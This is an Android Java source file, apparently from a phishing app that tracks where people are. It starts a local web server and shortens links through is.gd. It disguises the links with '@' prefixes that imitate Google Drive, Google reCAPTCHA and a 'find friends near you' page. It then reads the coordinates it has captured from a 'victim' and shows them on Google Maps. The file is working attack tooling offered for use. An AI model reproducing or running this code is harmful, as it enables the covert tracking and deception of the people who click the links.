package com.cyberfreak.cardviewtesting;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.IntentFilter;
import android.net.Uri;
import android.text.ClipboardManager;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Spinner;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class location_data_main extends AppCompatActivity {
String link=null;  String linkn_new=null;
Spinner spinner;
    private static final String USER_AGENT = "Mozilla/5.0";
    private static final String POST_URL ="https://is.gd/create.php?format=simple"; // Link Shortner api name changer
Button button;Context context=this;
    private ProgressBar loadingPB;
private MyHTTPD server;
TextView textView,data,text1,text13,gmap;
private ImageView img;
String[] templates={"Near You","GDrive","Google ReCaptcha"};
    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_location_data_main);
//
//        Intent intent = getIntent();
//        link = intent.getStringExtra("message_key");
        File file1 = new File(getFilesDir(), "link.txt");
        link=readFile(file1);   // Extracting link from Wireguard config file
        String lat=null,lon=null;
        Intent intent1 = new Intent(location_data_main.this, MyForegroundService.class);
        startService(intent1);
        textView=findViewById(R.id.textView15);
        text1=findViewById(R.id.victim_details);
        img=findViewById(R.id.imageView3);
        textView.setVisibility(View.GONE);
        button=findViewById(R.id.button4);
        data=findViewById(R.id.textView8);
        text13=findViewById(R.id.textView13);
        text13.setVisibility(View.GONE);
        text1.setVisibility(View.GONE);
        spinner=findViewById(R.id.spinner);
        loadingPB=findViewById(R.id.progressBar2);
        gmap=findViewById(R.id.textView20);
        data.setVisibility(View.GONE);
        ArrayAdapter<String> adapter=new ArrayAdapter<String>(location_data_main.this, android.R.layout.simple_spinner_item,templates);
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinner.setAdapter(adapter);
        spinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                linkn_new=link;
                String value=parent.getItemAtPosition(position).toString();
                if(position==0) {linkn_new=linkn_new+"nearyou";postDataUsingVolley(linkn_new,POST_URL,"https://find-friends-near-you@");}
                else if(position==1) {linkn_new=linkn_new+"gdrive";postDataUsingVolley(linkn_new,POST_URL,"https://private-file-googledrive@");}
                else {linkn_new=linkn_new+"captcha";postDataUsingVolley(linkn_new,POST_URL,"https://google.com-secure-page@");}

            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {

            }
        });
        img.setVisibility(View.GONE);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                server = new MyHTTPD(8080,location_data_main.this);
                try {
                    server.start();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                text13.setVisibility(View.VISIBLE);
                text1.setVisibility(View.VISIBLE);
                loadingPB.setVisibility(View.VISIBLE);
                textView.setVisibility(View.VISIBLE);


            }
        });
        String fileName = "myfile.txt";
        String fileContents = "";
        File file = new File(context.getFilesDir(), fileName);
        try (FileOutputStream fos = context.openFileOutput(fileName, Context.MODE_PRIVATE)) {
            fos.write(fileContents.getBytes());    // getBytes is working
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        startReadingFile();


    }

    private void postDataUsingVolley(String link,String url,String uri) {        //link, url

        RequestQueue queue = Volley.newRequestQueue(location_data_main.this);

        StringRequest request = new StringRequest(Request.Method.POST, url, new com.android.volley.Response.Listener<String>() {

            @SuppressLint("SetTextI18n")
            @Override
            public void onResponse(String response) {

                String real_url=uri;

                String afterHttps = response.substring(response.indexOf("https://") + "https://".length());
                URL url = null;
                try {
                    url = new URL(real_url);
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                }
                String temp=real_url;
                String final_uri=temp+afterHttps;
                textView.setText(final_uri);

//                Toast.makeText(location_data_main.this, "Data added to API", Toast.LENGTH_SHORT).show();

            }
        }, new com.android.volley.Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                // method to handle errors.
//                Toast.makeText(location_data_main.this, "Failed to get Response", Toast.LENGTH_SHORT).show();
            }
        }) {
            @Override
            protected Map<String, String> getParams() {

                Map<String, String> params = new HashMap<String, String>();
                params.put("url", link);
                return params;
            }
        };

        queue.add(request);

    }
    private void startReadingFile() {
        String filn="";
        File file = new File(getFilesDir(), "myfile.txt"); // File path in internal storage
        if (!file.exists()) {
            data.setText("File not found!");
            return;
        }

        // Start a background thread to continuously read the file contents
        Thread thread = new Thread(() -> {
            while (true) {
                try {
                    String lat=null,lon=null;
                    String fileContents = readFile(file);
                    // Update the UI on the main thread
                    // Regular expression pattern to match decimal numbers
                    Pattern pattern = Pattern.compile("\\d+\\.\\d+");

                    // Create a Matcher
                    Matcher matcher = pattern.matcher(fileContents);

                    // Match latitude
                    if (matcher.find()) {
                        lat = matcher.group();
                    }

                    // Match longitude
                    if (matcher.find()) {
                        lon = matcher.group();
                    }
                    runOnUiThread(() -> {data.setText(fileContents);});
                    if(data.getText()!=filn) {
                        String finalLat = lat;
                        String finalLon = lon;
                        runOnUiThread(()-> {
                            data.setVisibility(View.VISIBLE);
                            loadingPB.setVisibility(View.GONE);
                            text1.setVisibility(View.GONE);
                            img.setVisibility(View.VISIBLE);
                            gmap.setVisibility(View.VISIBLE);

                            img.setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View v) {
                                    link(finalLat, finalLon);
                                }
                            });
                        });
                    }
                    // Sleep for some time before reading again
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();
    }
    private void del(){
        String fileName = "myfile.txt"; // Replace with your file name

        File file1 = new File(getFilesDir(), fileName);

        if (file1.exists()) file1.delete();
    }
    private String readFile(File file) {
        StringBuilder stringBuilder = new StringBuilder();

        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return stringBuilder.toString();
    }
    private void link(String lat,String lon){
        Uri gmmIntentUri = Uri.parse("geo:0,0?z=10&q="+lat+","+lon);
        Intent mapIntent = new Intent(Intent.ACTION_VIEW, gmmIntentUri);
        mapIntent.setPackage("com.google.android.apps.maps");
        startActivity(mapIntent);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        // Stop the NanoHTTPD server
        if (server != null) {
            server.stop();
        }
}
}
